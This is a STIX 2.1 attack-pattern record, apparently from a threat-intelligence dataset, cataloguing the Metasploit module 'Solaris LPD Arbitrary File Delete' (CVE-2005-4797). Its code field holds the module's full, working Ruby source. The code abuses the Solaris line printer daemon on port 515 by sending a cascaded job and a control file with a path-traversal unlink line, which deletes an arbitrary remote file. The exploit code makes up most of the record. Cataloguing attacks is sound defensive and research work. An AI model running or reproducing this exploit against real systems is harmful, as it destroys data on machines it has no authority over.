{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--551e52a2-d049-4896-a2c4-852d876647a3",
    "created": "2024-08-14T16:24:57.096034Z",
    "modified": "2024-08-14T16:24:57.096038Z",
    "name": "Solaris LPD Arbitrary File Delete",
    "description": " This module uses a vulnerability in the Solaris line printer daemon to delete arbitrary files on an affected system. This can be used to exploit the rpc.walld format string flaw, the missing krb5.conf authentication bypass, or simply delete system files. Tested on Solaris 2.6, 7, 8, 9, and 10.  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/solaris/lpd/cascade_delete.rb",
            "external_id": "cascade_delete.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-4797"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Solaris LPD Arbitrary File Delete',\n      'Description'    => %q{\n        This module uses a vulnerability in the Solaris line printer\n        daemon to delete arbitrary files on an affected system. This\n        can be used to exploit the rpc.walld format string flaw, the\n        missing krb5.conf authentication bypass, or simply delete\n        system files. Tested on Solaris 2.6, 7, 8, 9, and 10.\n\n      },\n      'Author'         => [ 'hdm', 'Optyx <optyx[at]uberhax0r.net>' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-4797' ],\n          [ 'BID', '14510' ],\n          [ 'OSVDB', '18650' ]\n        ]\n      ))\n\n      register_options(\n        [\n          Opt::RPORT(515),\n          OptString.new('RPATH', [ true, \"The remote file path to delete\"]),\n        ])\n  end\n\n  def run\n\n\n    r_hostname = Rex::Text.rand_text_alpha(rand(8)+1)\n    r_user     = Rex::Text.rand_text_alpha(rand(8)+1)\n    r_spool    = Rex::Text.rand_text_alpha(rand(8)+1)\n\n    # Create a simple control file...\n    control = \"H#{r_hostname}\\nP#{r_user}\\n\";\n\n    # The job ID is squashed down to three decimal digits\n    jid   = ($$ % 1000).to_s + [Time.now.to_i].pack('N').unpack('H*')[0]\n\n    # Establish the first connection to the server\n    sock1 = connect(false)\n\n    # Request a cascaded job\n    sock1.put(\"\\x02#{r_hostname}:#{r_spool}\\n\")\n    res = sock1.get_once\n    if (not res)\n      print_status(\"The target did not accept our job request command\")\n      return\n    end\n\n    # Theoretically, we could delete multiple files at once, however\n    # the lp daemon will append garbage from memory to the path name\n    # if we don't stick a null byte after the path. Unfortunately, this\n    # null byte will prevent the parser from processing the other paths.\n    control << \"U\" + (\"../\" * 10) + \"#{datastore['RPATH']}\\x00\\n\"\n\n    dataf = Rex::Text.rand_text_alpha(100)+1\n\n    print_status(\"Deleting #{datastore['RPATH']}...\")\n    if !(\n        send_file(sock1, 2, \"cfA\" + jid + r_hostname, control) and\n        send_file(sock1, 3, \"dfa\" + jid + r_hostname, dataf)\n      )\n      sock1.close\n      return\n    end\n\n    print_good(\"Successfully deleted #{datastore['RPATH']} >:-]\")\n    sock1.close\n  end\n\n  def send_file(s, type, name, data='')\n\n    s.put(type.chr + data.length.to_s + \" \" + name + \"\\n\")\n    res = s.get_once(1)\n    if !(res and res[0] == ?\\0)\n      print_status(\"The target did not accept our control file command (#{name})\")\n      return\n    end\n\n    s.put(data)\n    s.put(\"\\x00\")\n    res = s.get_once(1)\n    if !(res and res[0] == ?\\0)\n      print_status(\"The target did not accept our control file data (#{name})\")\n      return\n    end\n\n    print_status(sprintf(\"     Uploaded %.4d bytes >> #{name}\", data.length))\n    return true\n  end\nend\n"
}